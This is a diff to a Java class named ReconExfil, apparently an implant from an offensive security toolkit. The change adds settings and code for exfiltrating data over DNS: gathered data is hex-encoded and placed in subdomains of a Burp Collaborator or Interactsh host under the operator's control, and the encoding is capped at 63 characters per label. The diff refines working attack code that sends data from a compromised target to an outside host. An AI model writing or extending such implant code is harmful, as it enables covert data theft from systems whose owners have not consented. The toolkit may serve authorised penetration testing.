@@ -12,7 +12,21 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
     static volatile String CONF_JVM_MARKER_PROP = "java.class.init";
     static volatile boolean CONF_BLOCK_JVM_SHUTDOWN = false;
     static volatile int CONF_DELAY_MS = 0;
-    static volatile String CONF_EXFIL_DNS;  // Set this to a Burp Collaborator / Interactsh hostname under your control
+
+    /**
+     * Top domain to use for data exfiltration.
+     * Data will be encoded and included as a subdomain to this top domain.
+     * Set this to a Burp Collaborator / Interactsh (or equivalent) hostname that's under your control.
+     */
+    static volatile String CONF_EXFIL_DNS;
+
+    /**
+     * Maximum number of characters for each subdomain.
+     * DNS specifies a maximum number of 63 characters. However, if there are any concerns around some DNS servers
+     * capping this off even more, or if you with to just cap it even lower, then set this value appropriately.
+     * Note: This simple implant will just cut any excess hex digits (resulting in a data loss).
+     */
+    static volatile int CONF_SUBDOMAIN_MAX_LEN = 63;
 
     @SuppressWarnings("unused")
     public static void init() {
@@ -84,7 +98,7 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
     }
 
     // Just hex represent it for now. This is very space inefficient, but at least it's compatible with DNS.
-    private static String encode(String input) {
+    static String encode(String input) {
         if (input == null) {
             input = "null";
         }
@@ -98,7 +112,13 @@ public class ReconExfil implements Runnable, Thread.UncaughtExceptionHandler {
             hexString.append(hex);
         }
 
-        return hexString.toString();
+        if (hexString.length() > CONF_SUBDOMAIN_MAX_LEN) {
+            // Make sure encoded output always consists of full bytes (pairs of two hex digits)
+            int cutoffPos = CONF_SUBDOMAIN_MAX_LEN - (CONF_SUBDOMAIN_MAX_LEN % 2);
+            return hexString.substring(0, cutoffPos);
+        } else {
+            return hexString.toString();
+        }
     }
 
     // Use the default system resolver for now
